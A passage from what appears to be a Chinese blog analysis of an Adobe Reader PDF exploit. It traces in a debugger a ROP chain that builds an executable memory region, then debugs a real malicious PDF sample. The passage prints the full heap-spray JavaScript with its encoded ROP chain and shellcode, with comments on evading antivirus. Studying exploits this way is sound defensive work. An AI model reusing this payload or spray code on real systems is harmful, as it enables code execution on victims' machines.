                     data-src="http://imgsrc.baidu.com/forum/pic/item/c2cec3fdfc039245b8b3cec5c294a4c27c1e25f1.jpg"
                     
                ></p>
<p>发现是保存<code>eax</code>到刚刚赋值<code>ecx</code>的地址那儿，也就是0x4A8A0000，然后上面的函数ret过后，会再次从栈上弹出值到<code>eax</code>当中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4A801F90    58              pop eax                           ; &lt;&amp;KERNEL32.CreateFileA&gt;</span><br><span class="line">4A801F91    C3              retn</span><br><span class="line">4A801F92    33C0            xor eax,eax</span><br><span class="line">4A801F94    C3              retn</span><br><span class="line">4A801F95 &gt;  8B4C24 04       mov ecx,dword ptr ss:[esp+0x4]    ; icucnv36.4A80B692</span><br><span class="line">4A801F99    85C9            test ecx,ecx                      ; icucnv36.4A8A0000</span><br></pre></td></tr></table></figure></div>

<p>这里弹出的值是<CreateFileA>的符号值，然后进入<code>retn</code>，发现是<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16d2b1b5abb6deb48f8d546481.jpg"
                     
                ></p>
<p>直接jmp [eax]，也就是直接执行<code>kernel32.CreateFileA</code>这个函数，并且此时在栈上也已经构造好了参数如下：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb13090813d99854564e93584b92.jpg"
                     
                ></p>
<p>步入这个函数查看内部实现情况<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/54fbb2fb43166d2296323a5e032309f79152d2b7.jpg"
                     
                ></p>
<p>移步到右下角这是解析的参数，这个<code>CreateFileA</code>函数的功能是打开某个文件，如果没这个文件就会创建，其名为<code>iso88591</code>,使用ctrl + F9来执行到返回，然后查看是否创建出了这个文件（会被创建在桌面上）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/f2deb48f8c5494eec5de20d368f5e0fe98257e7f.jpg"
                     
                ></p>
<p>可以看到标注的那个文件，确实是<code>iso88591</code>(这里注意如果windows的隐藏文件夹选项开着那就看不到，记得到控制面板设置一下之后继续调试)，刚刚已经返回，如下：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d833c895d143ad4b5cdc690ac7025aafa50f060d.jpg"
                     
                ></p>
<p>此时<code>eax</code>应该是上面函数的返回值，其为我们刚刚创建的文件句柄，也就是0x33c，然后交换<code>eax</code>和<code>edi</code>，再次步入<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/622762d0f703918f6e9f1300143d269758eec4aa.jpg"
                     
                ></p>
<p>将栈上的8弹给<code>ebx</code>，接着步入<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/80cb39dbb6fd5266ac6c12deee18972bd50736b0.jpg"
                     
                ></p>
<p>可以看到上面的图中将<code>edi</code>,也就是之前的文件句柄传给了esp + ebp*2的地址，可以看到<code>ebx</code>为刚刚的8，也就是距离栈顶偏移0x10字节，也就是将0x0c0c0c6c上原来的值0xFFFFFFFF改为文件句柄，也就是0x33c,然后ctrl+F9跳转到返回<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e9b8a80aa0ac2d56284356868.jpg"
                     
                ></p>
<p>此时再将<code>CreateFileMappingA</code>的函数地址弹到<code>eax</code>，然后步入可以发现是直接执行<code>eax</code>保存的函数地址<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/b3b7d0a20cf431add9396df30e36acaf2fdd9814.jpg"
                     
                ></p>
<p>内部执行情况单步步入之后如下，并且可以发现其中的栈上的函数参数,其中第一个参数就是刚刚的文件句柄，第三个参数就是传递的保护措施，可以看到也是可执行可读可写的，因此就可以传递<code>shellcode</code>复制到此处执行<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/c2fdfc039245d688bae39c6ee1c27d1ed31b2412.jpg"
                     
                ></p>
<p>执行完毕使用ctrl + F9,再次跳转到结尾，发现同之前一样，交换<code>eax</code>和<code>edi</code>，也就是创建文件映射的句柄给到了<code>edi</code><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c870112789c2c627f9e2f0608ff2a.jpg"
                     
                ></p>
<p>然后同之前上面一样的操作，通过布置好的ROP链来执行<code>MapViewOfFile</code>，直接掠过这里调试，跟上面两个函数一样，没什么好说的<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/4610b912c8fcc3ceaaf8e0f9d745d688d43f203b.jpg"
                     
                ></p>
<p>可以看到上面图片中调用<code>MapViewOfFile</code>函数的参数，调用该函数后，会返回该文件对象在内存当中对应的地址<br>该函数返回后如下：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/dbb44aed2e738bd403059bfbe48b87d6267ff9d0.jpg"
                     
                ></p>
<p>其中<code>eax</code>即为文件对象在内存中的地址为0x048D0000<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d50735fae6cd7b891d6813494a2442a7d8330ef7.jpg"
                     
                ></p>
<p>不难看出这块映射区RWE权限均有，之后的调试就会将文件内存地址存放在0x4A8A004的地址了，如下<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b506c8bc998c035e5dde6116e87.jpg"
                     
                ></p>
<p>在<code>retn</code>的地址存放该0x48D0000,方便ROP链返回<br>以同样的手段执行<code>memcpy</code>函数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343fa88aeebd613b07ecb8088b0.jpg"
                     
                ></p>
<p>可以看到其中目的地址是0x048D0000,而0x0c0c0D54存放着恶意代码</p>
<p>使用ctrl + F9来跳到执行函数结束，如下：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/09fa513d269759eeefe94901f7fb43166c22dfbb.jpg"
                     
                ></p>
<p>可以看到文件对象的内存地址处已经拷贝过去了大量恶意代码，并且<code>retn</code>是直接返回到0x048D00这里，也就是这个文件处执行，而因为这个文件有RWX权限，所以说可以执行该文件恶意代码。</p>
<p>因此从ROP链到执行恶意代码，分为以下几个步骤：</p>
<ol>
<li>利用溢出来构造ROP链,ROP链通过布置不带ALSR的库中gadget来绕过此机制,通过两次栈迁移来到达0x0C0C0C0C,通过堆喷在这里构造好栈数据和恶意代码</li>
<li>调用CreateFileA函数,创建ios88591这个文件</li>
<li>调用CreateFileMappingA函数,构造该文件在内存中的映射</li>
<li>调用MapviewOfFile函数,返回该文件映射在内存中的地址,上面3步是为了构造一块可执行可读可写的内存区域</li>
<li>调用memcpy,来将恶意代码存放到该文件映射当中</li>
<li>跳转到恶意代码执行</li>
</ol>
<h2 id="6-堆喷-Heap-Spray"><a href="#6-堆喷-Heap-Spray" class="headerlink" title="6.堆喷(Heap Spray)"></a>6.堆喷(Heap Spray)</h2><p>利用pdf中内嵌的javascript来申请，首先申请个200MB的内存，而一般分配内存都是从低地址开始分配，因此大概率0x0c0c0c0c会被包含在其中，而这里一般会在前面的部分大量填充0x90，表示NOP指令(也就是雪橇)如果ROP到0x0c0c0c0c，就会通过该雪橇滑向布置的ROP链上。（懒得画结构图，偷了一个）<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/0df431adcbef760958c9b0556bdda3cc7dd99e3d.jpg"
                     
                ></p>
<p>可以通过PdfStreamDumper来解析pdf文件，从中提取出JavaScript代码，如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">&quot;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x25\x7530e8\x25\x750000\x25\x75ad00\x25\x757d9b\x25\x75acdf\x25\x75da08\x25\x751676\x25\x75fa65&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uec10%u0397%ufb0c%ufd97%u330f%u8aca%uea5b%u8a49&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ud9e8%u238a%u98e9%u8afe%u700e%uef73%uf636%ub922&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u7e7c%ue2d8%u5b73%u8955%u81e5%u48ec%u0002%u8900&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ufc5d%u306a%u6459%u018b%u408b%u8b0c%u1c70%u8bad&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0858%u0c6a%u8b59%ufc7d%u5351%u74ff%ufc8f%u8de8&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0002%u5900%u4489%ufc8f%ueee2%u016a%u8d5e%uf445&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u5650%u078b%ud0ff%u4589%u3df0%uffff%uffff%u0475&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u5646%ue8eb%u003d%u0020%u7700%u4604%ueb56%u6add&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u6a00%u6800%u1200%u0000%u8b56%u0447%ud0ff%u006a&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u458d%u50ec%u086a%u458d%u50b8%u8b56%u0847%ud0ff&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uc085%u0475%u5646%ub4eb%u7d81%u50b8%u5064%u7444&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u4604%ueb56%u81a7%ubc7d%ufeef%uaeea%u0474%u5646&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u9aeb%u75ff%u6af0%uff40%u0c57%u4589%u85d8%u75c0&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ue905%u0205%u0000%u006a%u006a%u006a%uff56%u0457&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u006a%u458d%u50ec%u75ff%ufff0%ud875%uff56%u0857&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uc085%u0575%ue2e9%u0001%u5600%u57ff%u8b10%ud85d&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u838b%u1210%u0000%u4589%u8be8%u1483%u0012%u8900&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ue445%u838b%u1218%u0000%u4589%u03e0%ue445%u4503&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u89e8%udc45%u8a48%u0394%u121c%u0000%uc230%u9488&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u1c03%u0012%u8500%u77c0%u8deb%ub885%ufffe%u50ff&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uf868%u0000%uff00%u1457%ubb8d%u121c%u0000%uc981&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uffff%uffff%uc031%uaef2%ud1f7%ucf29%ufe89%uca89&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ubd8d%ufeb8%uffff%uc981%uffff%uffff%uaef2%u894f&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uf3d1%u6aa4%u8d02%ub885%ufffe%u50ff%u7d8b%ufffc&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u1857%uff3d%uffff%u75ff%ue905%u014d%u0000%u4589&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u89c8%uffc2%ue875%u838d%u121c%u0000%u4503%u50e0&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ub952%u0100%u0000%u548a%ufe48%u748a%uff48%u7488&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ufe48%u5488%uff48%ueee2%u57ff%uff1c%uc875%u57ff&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u8d10%ub885%ufffe%ue8ff%u0000%u0000%u0481%u1024&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0000%u6a00%u5000%u77ff%uff24%u2067%u57ff%u8924&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ud045%uc689%uc789%uc981%uffff%uffff%uc031%uaef2&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ud1f7%u8949%ucc4d%ubd8d%ufeb8%uffff%u0488%u490f&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u048a%u3c0e%u7522%u491f%u048a%u3c0e%u7422%u8807&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0f44%u4901%uf2eb%ucf01%uc781%u0002%u0000%u7d89&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ue9c0%u0013%u0000%u048a%u3c0e%u7420%u8806%u0f04&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ueb49%u01f3%u47cf%u7d89%uffc0%uf075%u406a%u558b&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ufffc%u0c52%u4589%u89d4%u8bc7%ue875%u7503%u01e0&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u81de%u1cc6%u0012%u8b00%ue44d%ua4f3%u7d8b%u6afc&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uff00%uc075%u57ff%u8918%uc445%uff3d%uffff%u74ff&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u576a%uc389%u75ff%ufff0%ud475%uff50%u1c57%uff53&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u1057%u7d8b%u81c0%uffc9%uffff%u31ff%uf2c0%uf7ae&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u29d1%u89cf%u8dfe%ub8bd%ufffd%uc7ff%u6307%u646d&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uc72e%u0447%u7865%u2065%u47c7%u2f08%u2063%u8122&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0cc7%u0000%uf300%u4fa4%u07c6%u4722%u07c6%u5f00&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x25\x75858d\x25\x75fdb8\x25\x75ffff\x25\x7500e8\x25\x750000\x25\x758100\x25\x752404\x25\x750010&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0000%u006a%uff50%u2477%u67ff%u6a20%uff00%u2c57&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u5553%u5756%u6c8b%u1824%u458b%u8b3c%u0554%u0178&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u8bea%u184a%u5a8b%u0120%ue3eb%u4932%u348b%u018b&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u31ee%ufcff%uc031%u38ac%u74e0%uc107%u0dcf%uc701&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uf2eb%u7c3b%u1424%ue175%u5a8b%u0124%u66eb%u0c8b&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u8b4b%u1c5a%ueb01%u048b%u018b%uebe8%u3102%u89c0&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u5fea%u5d5e%uc25b%u0008&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">// unescape(&quot;%u0c0c%u0c0c&quot;); 滑块代码 0x0c 等于指令 OR al, 0C; 大量执行对 shellcode 无影响</span></span><br><span class="line"><span class="keyword">var</span> nop_chip = <span class="built_in">unescape</span>(<span class="string">&quot;\x25\x750c0c\x25\x750c0c&quot;</span>);</span><br><span class="line"><span class="comment">// 65536 等于 0x10000 等于 2 ^ 16 等于 64KB, 这里的 20+8 应该是用来免杀用的，无实际作用</span></span><br><span class="line"><span class="keyword">while</span> (nop_chip.<span class="property">length</span> + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>)</span><br><span class="line">    nop_chip += nop_chip;</span><br><span class="line"><span class="comment">// 精准堆喷，使 shellcode 开始的地方一定在 0c0c 结尾的地址 0x....0c0c 处</span></span><br><span class="line">temp_chip = nop_chip.<span class="title function_">substring</span>(<span class="number">0</span>, (<span class="number">0x0c0c</span> - <span class="number">0x24</span>) / <span class="number">2</span>);</span><br><span class="line">temp_chip += shellcode; <span class="comment">//拼接上 shellcode，该位置一定在 0c0c 结尾的地址处</span></span><br><span class="line">temp_chip += nop_chip; <span class="comment">//拼接后续的滑块代码 </span></span><br><span class="line"><span class="comment">// shellcode 小片段一个是 0x10000 大小，unicode 一个长度等于2字节，0x10000实际是 0x20000 字节大小，除2 为 0x10000</span></span><br><span class="line">small_shellcode_slide = temp_chip.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">65536</span> / <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 最终一个shellcode实际大小为 1MB，0x80000 * 2 = 0x100000 = 1MB</span></span><br><span class="line"><span class="keyword">while</span> (small_shellcode_slide.<span class="property">length</span> &lt; <span class="number">0x80000</span>)</span><br><span class="line">    small_shellcode_slide += small_shellcode_slide;</span><br><span class="line"><span class="comment">// 从后面截短 0x1020 - 0x08 = 4120 字节，目的应该是让实际大小小于1MB，因为这里分配的一个堆块是1MB大小，shellcode_slide 应该小于堆块大小</span></span><br><span class="line">shellcode_slide = small_shellcode_slide.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span> - <span class="number">0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> slide = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="comment">// 0x1f0 等于 496 ，也就是在内存中申请了接近 500 MB 的内存</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x1f0</span>; i++) </span><br><span class="line">    slide[i] = shellcode_slide + <span class="string">&quot;s&quot;</span>;<span class="comment">// s 字符无实际作用，估计用于免杀</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到上面代码首先是构造一个链条</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nop_chip = <span class="built_in">unescape</span>(<span class="string">&quot;\x25\x750c0c\x25\x750c0c&quot;</span>);</span><br><span class="line"><span class="comment">// 65536 等于 0x10000 等于 2 ^ 16 等于 64KB, 这里的 20+8 应该是用来免杀用的，无实际作用</span></span><br><span class="line"><span class="keyword">while</span> (nop_chip.<span class="property">length</span> + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>)</span><br><span class="line">    nop_chip += nop_chip;</span><br></pre></td></tr></table></figure></div>

<p>上述代码可以近似看作拼接大量<code>nop</code>指令，然后精准堆喷，这里截取一下构造链条，使得<code>shellcode</code>能被存放在0x****0c0c,这里减去0x24，是因为堆头部会占据0x20字节，然后shellcode首部添加了4个‘A’</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 精准堆喷，使 shellcode 开始的地方一定在 0c0c 结尾的地址 0x....0c0c 处</span></span><br><span class="line">temp_chip = nop_chip.<span class="title function_">substring</span>(<span class="number">0</span>, (<span class="number">0x0c0c</span> - <span class="number">0x24</span>) / <span class="number">2</span>);</span><br><span class="line">temp_chip += shellcode; <span class="comment">//拼接上 shellcode，该位置一定在 0c0c 结尾的地址处</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/472309f790529822ae6a110992ca7bcb0b46d49b.jpg"
                     
                ></p>
<h2 id="7-恶意样本分析"><a href="#7-恶意样本分析" class="headerlink" title="7.恶意样本分析"></a>7.恶意样本分析</h2><p>已经完成了样本分析过程，接下来看看恶意代码的调试分析，首先是调试界面，之前使用的分析样本是简单的执行一个计算器的打印，但是这里拿真正的恶意样本来进行分析，名字是一个名企面试自助手册<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/0b55b319ebc4b745d9899cdc8afc1e178b8215de.jpg"
                     
                ></p>
<p>此时像之前漏洞分析一样直接运行到恶意代码处，这里是call了一个值，步入查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/48540923dd54564ed271cff3f6de9c82d0584fe7.jpg"
                     
                ></p>
<p>恶意代码会从 <code>kernel32.dll</code> 中获取想要调用的函数地址。首先获取了<code> kernel32.dll</code> 的基地址，0x4930044 处先赋值 <code>ecx</code> 为 0x30 ，fs[0x30] 处即为进程环境块<code> PEB</code> 的指针，通过 PEB + 0xC 偏移处获取<code>PEB_LDR_DATA</code> 结构体指针，<code>PEB_LDR_DATA</code> 偏移 0x1C 处获取<code>InInitializationOrderModuleList</code>成员指针，<code>lods [esi] </code>获取双向链表当前节点的后继指针, 指向<code> kernel32.dll</code> 节点，找到属于<code>kernel32.dll</code>的结点后，在其基础上再偏移0x08就是<code>kernel32.dll</code>在内存中的加载基地址。获取加载基地址为 0x7C800000 ，保存在 <code>ebx</code> 中，如下图：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/4034970a304e251fc182cf32e286c9177e3e5386.jpg"
                     
                ></p>
<p>而上图中即将压入栈的0xC是即将寻找的函数数量，而上图中会运行到一个call函数，步入如下：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/738b4710b912c8fca5afdd07b9039245d788219f.jpg"
                     
                ></p>
<p>栈上第一个参数是第一个函数的hash，第二个为<code>kernel32.dll</code>的基地址，然后0x49302f8地址指令会将该基地址偏移0x3c的值赋给<code>eax</code>，这个0x3c是PE头部偏移量的存储位置，在PE头部偏移0x78处，也就是<code>kernel32.dll</code>导出表的虚拟地址0x262c赋值给<code>edx</code><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/1c950a7b02087bf4ca527c23b7d3572c10dfcfba.jpg"
                     
                ></p>
<p>此时<code>edx</code>是存放着<code>kernel32.dll</code>导出表的虚拟地址的,再将偏移0x18和0x20的值分别存放在<code>ecx</code>和<code>ebx</code>中，这里的偏移分别保存着导出表函数的数目和导出表函数名称表的地址偏移</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c3361d7f5025f4c510fd8f9a14a.jpg"
                     
                ></p>
<p>然后继续单步，发现在0x493030F,这里是将函数表中最后一个函数名称地址放入<code>esi</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/7a899e510fb30f24c604c7c98d95d143ac4b0359.jpg"
                     
                ></p>
<p>可以看到上面放入<code>esi</code>的函数名是<code>IstrenW</code>,然后我们在0x493031B处根据函数名计算hash，然后同之前我们压栈的hash([esp + 0x14])进行比较，若相同则继续往下走<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/fcfaaf51f3deb48fa3fb8a14b51f3a292cf5786d.jpg"
                     
                ></p>
<p>然后我们在<code>cmp</code>那里下一个条件断点，免得一直循环，我们选择<code>conditional</code>这条，然后条件写<code>esp == [esp+ 0x14]</code>,然后F9<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d6ca7bcb0a46f21f5fc47599b3246b600d33ae0c.jpg"
                     
                ></p>
<p>可以看到专门存放函数名的<code>esi</code>，此时是<code>ExitThread</code>，说明我们要寻找的函数就是他</p>
<ol>
<li>先在导出表偏移 0x24 处获取输出序号数组的地址</li>
<li>通过输出序号数组获取<code>ExitThread</code>函数的序号，其中 ECX 就是序号</li>
<li>获取函数地址数组</li>
<li>根据序号在函数地址数组中找到<code>ExitThread</code>函数的地址，保存在 <code>eax</code> 中，可以看到下图此时 <code>eax</code> 已经指<code>ExitProcess</code> 函数，猜测在实际中，<code>ExitThread </code>函数即为<code>ExitProcess</code>函数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d62a6059252dd42ac7d72a61463b5bb5c8eab81a.jpg"
                     
                ></li>
</ol>
<p>然后执行到这里会将其存放在[edi+ecx*4-0x4],</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">04930063    59              pop ecx</span><br><span class="line">04930064    89448F FC       mov dword ptr ds:[edi+ecx*4-0x4],eax   ; kernel32.ExitProcess</span><br><span class="line">04930068  ^ E2 EE           loopd short 04930058</span><br></pre></td></tr></table></figure></div>

<p>接下来接着循环，此时的<code>ecx</code>存放着要解析的函数数目，这里可以看到将<code>eax</code>指向的函数指针保存在内存中某个位置，同样在此处下一个条件断点，条件为<code>ecx == 1</code>,然后F9，此时执行完毕会发现对应内存填充了函数地址<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d8f9d72a6059252d393237ce719b033b5ab5b9d7.jpg"
                     
                ></p>
<p>调用<code>GetFileSize</code>函数，若发现其大于，此处会一直遍历所有<code>handler</code>并获取文件大小，比较是否大于 0x2000，如果大于则跳转到 0x493008F。在此处下个断点，然后运行查看<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/6159252dd42a2834dbd41cc11eb5c9ea14cebf8e.jpg"
                     
                ></p>
<p>(这里出了个问题，就是之前用计算器简单脚本所执行的iso88591没清理干净，导致运行始终不如意，这里我恢复虚拟机快照后重新编译了一遍，此时其他的基本没变，只是我们恶意代码的基地址变了一下这里底下才是正确的返回值)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/2fdda3cc7cd98d10172926fb643fb80e7aec907e.jpg"
                     
                ></p>
<p><code>esi</code>指向的句柄为0x310，指向的<code>eax</code>为文件大小，为0x1CAD74，然后点击上面的H来查看一下内存中存在的句柄，可以发现恰好就是恶意文件pdf</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
